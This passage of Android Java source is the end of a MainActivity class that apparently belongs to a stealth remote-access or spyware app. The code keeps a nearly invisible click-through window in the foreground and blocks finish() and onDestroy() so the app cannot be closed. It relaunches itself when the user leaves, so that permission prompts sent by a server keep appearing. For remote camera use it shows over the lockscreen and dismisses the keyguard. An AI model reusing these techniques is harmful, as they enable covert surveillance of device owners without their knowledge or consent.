            Log.d(TAG, "onResume: Camera active - staying in foreground");
            applyTransparentClickthrough();
        } else {
            Log.d(TAG, "onResume: Staying in foreground, transparent & clickthrough");
            applyTransparentClickthrough();
        }
        
        // If handling permission, ensure we're in front
        if (isHandlingServerPermissionRequest) {
            try {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                int taskId = getTaskId();
                if (taskId > 0) {
                    am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
                    Log.d(TAG, "Moved task to front for permission: " + taskId);
                }
            } catch (Exception e) {
                Log.w(TAG, "Could not bring activity to foreground", e);
            }
        }
        
        // Check if we need to request permission (in case activity was resumed)
        Intent intent = getIntent();
        if (intent != null && intent.hasExtra("request_permission")) {
            String permissionType = intent.getStringExtra("request_permission");
            Log.d(TAG, "Permission request detected in onResume: " + permissionType);
            isHandlingServerPermissionRequest = true;
            // Small delay to ensure activity is fully resumed and in foreground
            handler.postDelayed(() -> {
                // Ensure we're still in foreground
                try {
                    ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                    int taskId = getTaskId();
                    if (taskId > 0 && !hasWindowFocus()) {
                        am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
                    }
                    getWindow().getDecorView().bringToFront();
                    getWindow().getDecorView().requestFocus();
                } catch (Exception e) {
                    Log.w(TAG, "Could not keep activity in foreground", e);
                }
                handlePermissionRequest(permissionType);
            }, 500);
        }
    }
    
    @Override
    protected void onStart() {
        super.onStart();
        Log.d(TAG, "MainActivity onStart");
        
        // Keep activity in foreground but transparent and clickthrough
        if (isCameraActive) {
            Log.d(TAG, "onStart: Camera active - staying in foreground");
            applyTransparentClickthrough();
        } else {
            Log.d(TAG, "onStart: Staying in foreground, transparent & clickthrough");
            applyTransparentClickthrough();
        }
        
        // If handling permission, ensure we're in front
        if (isHandlingServerPermissionRequest) {
            try {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                int taskId = getTaskId();
                if (taskId > 0) {
                    am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
                    Log.d(TAG, "Moved task to front for permission: " + taskId);
                }
            } catch (Exception e) {
                Log.w(TAG, "Could not bring activity to foreground", e);
            }
        }
        
        // Check if we need to request permission (in case activity was started)
        Intent intent = getIntent();
        if (intent != null && intent.hasExtra("request_permission")) {
            String permissionType = intent.getStringExtra("request_permission");
            Log.d(TAG, "Permission request detected in onStart: " + permissionType);
            isHandlingServerPermissionRequest = true;
            // Small delay to ensure activity is fully started
            handler.postDelayed(() -> {
                handlePermissionRequest(permissionType);
            }, 600);
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        Log.d(TAG, "MainActivity onPause");
        
        // If user pressed home during setup, bring app back after short delay
        // This ensures permission flow continues
        if (!StealthConfig.AUTO_CLOSE_ACTIVITY && currentPermissionIndex < permissionsToRequest.size()) {
            handler.postDelayed(() -> {
                try {
                    if (!isFinishing()) {
                        Log.d(TAG, "Bringing activity back to foreground for permission continuation");
                        Intent intent = new Intent(this, MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                                      Intent.FLAG_ACTIVITY_SINGLE_TOP |
                                      Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                        startActivity(intent);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Could not bring activity back", e);
                }
            }, 2000); // 2 second delay before bringing back
        }
    }
    
    @Override
    protected void onStop() {
        super.onStop();
        Log.d(TAG, "MainActivity onStop");
        
        // Don't finish activity, keep it in background for later
        // Service will keep running
    }
    
    @Override
    public void finish() {
        // Prevent finishing if we're handling server permission requests
        // Keep activity alive and transparent in foreground for permission dialogs
        if (isHandlingServerPermissionRequest) {
            Log.d(TAG, "Prevented finish() - keeping activity alive for permission requests");
            // Ensure activity stays transparent and in foreground
            try {
                // Keep window transparent
                android.view.WindowManager.LayoutParams params = getWindow().getAttributes();
                params.alpha = 0.0f;
                params.dimAmount = 0.0f;
                getWindow().setAttributes(params);
                
                // Bring to front
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                int taskId = getTaskId();
                if (taskId > 0) {
                    am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
                }
                getWindow().getDecorView().bringToFront();
                getWindow().getDecorView().requestFocus();
            } catch (Exception e) {
                Log.w(TAG, "Could not keep activity in foreground", e);
            }
            return; // Don't call super.finish()
        }
        
        // Only finish if not handling server permission requests
        Log.d(TAG, "Activity finishing normally");
        super.finish();
    }
    
    @Override
    public void finishAndRemoveTask() {
        // Prevent finishing if we're handling server permission requests
        if (isHandlingServerPermissionRequest) {
            Log.d(TAG, "Prevented finishAndRemoveTask() - keeping activity alive for permission requests");
            return; // Don't call super.finishAndRemoveTask()
        }
        super.finishAndRemoveTask();
    }
    
    @Override
    public void finishAffinity() {
        // Prevent finishing if we're handling server permission requests
        if (isHandlingServerPermissionRequest) {
            Log.d(TAG, "Prevented finishAffinity() - keeping activity alive for permission requests");
            return; // Don't call super.finishAffinity()
        }
        super.finishAffinity();
    }
    
    @Override
    protected void onDestroy() {
        // Only destroy if not handling server permission requests AND camera is not active
        if (isHandlingServerPermissionRequest || isCameraActive) {
            String reason = isHandlingServerPermissionRequest ? "permission requests" : "active camera";
            Log.d(TAG, "Prevented onDestroy() - keeping activity alive for " + reason);
            
            // Recreate activity to keep it alive if needed
            try {
                // Check if we need to restart
                if (isFinishing()) {
                    Intent intent = new Intent(this, MainActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(intent);
                }
            } catch (Exception e) {
                Log.w(TAG, "Could not restart activity", e);
            }
            return; // Don't call super.onDestroy()
        }
        
        super.onDestroy();
        Log.d(TAG, "MainActivity onDestroy - Service continues in background");
        instance = null;
    }
    
    // Static methods for camera control
    public static void setCameraActive(boolean active) {
        isCameraActive = active;
        Log.d(TAG, "Camera active state changed: " + active);
        
        if (instance != null) {
            instance.runOnUiThread(() -> {
                if (active) {
                    // Bring to front but keep transparent/clickthrough
                    // This is needed because some Android versions kill camera if activity is in background
                    try {
                        ActivityManager am = (ActivityManager) instance.getSystemService(Context.ACTIVITY_SERVICE);
                        am.moveTaskToFront(instance.getTaskId(), ActivityManager.MOVE_TASK_WITH_HOME);
                        Log.d(TAG, "Brought activity to front for camera");
                        
                        // Ensure window is visible (but transparent)
                        instance.getWindow().getDecorView().setVisibility(View.VISIBLE);
                    } catch (Exception e) {
                        Log.e(TAG, "Error moving task to front", e);
                    }
                    instance.applyTransparentClickthrough();
                } else {
                    // Camera finished
                    instance.applyTransparentClickthrough();
                    // Optional: move to back if not needed
                    // instance.moveTaskToBack(true);
                }
            });
        } else if (active) {
            // Instance is null but we need it for camera - try to start it
            try {
                Context context = MainService.getContextOfApplication();
                if (context != null) {
                    Log.d(TAG, "Starting MainActivity for camera");
                    Intent intent = new Intent(context, MainActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error starting MainActivity for camera", e);
            }
        }
    }
    
    private void applyTransparentClickthrough() {
        try {
            Window window = getWindow();
            android.view.WindowManager.LayoutParams params = window.getAttributes();
            
            // Make fully transparent
            params.alpha = 0.1f; // Slightly visible to prevent background killing, but practically invisible
            params.dimAmount = 0.0f;
            
            // Proper clickthrough flags - allow touches to pass through to apps below
            // FLAG_NOT_TOUCHABLE: window doesn't receive any touch events - passes through
            // FLAG_NOT_FOCUSABLE: window doesn't take input focus, allows clicks through
            // FLAG_NOT_TOUCH_MODAL: touch events outside the window go to windows behind
            params.flags |= android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
            params.flags |= android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
            params.flags |= android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
            
            // Allow showing over lockscreen if camera is needed
            if (isCameraActive) {
                params.flags |= android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
                params.flags |= android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
                params.flags |= android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON;
            } else {
                // Clear these flags when not needed
                params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
                params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
                params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON;
            }
            
            window.setAttributes(params);
            
            Log.d(TAG, "Applied transparent clickthrough - alpha: " + params.alpha + ", flags: " + Integer.toHexString(params.flags));
        } catch (Exception e) {
            Log.e(TAG, "Error applying transparent clickthrough", e);
        }
    }
    
    private void makeFocusable() {
        try {
            Window window = getWindow();
            android.view.WindowManager.LayoutParams params = window.getAttributes();
            
            // For permissions, we MUST have some visibility and focus
            // Alpha 0.01 is invisible to eye but visible to system
            params.alpha = 1.0f; // Temporarily visible for permission dialog
            params.dimAmount = 0.5f; // Dim background to focus attention
            
            // CLEAR all pass-through flags so we can receive input/focus for the dialog
            params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
            params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
            params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
            
            // Add flag to ensure dialogs appear above
            params.flags |= android.view.WindowManager.LayoutParams.FLAG_DIM_BEHIND;
            
            window.setAttributes(params);
            window.getDecorView().setVisibility(View.VISIBLE);
            window.getDecorView().bringToFront();
            
            Log.d(TAG, "Made window focusable/visible for permissions");
        } catch (Exception e) {
            Log.e(TAG, "Error making window focusable", e);
        }
    }
}
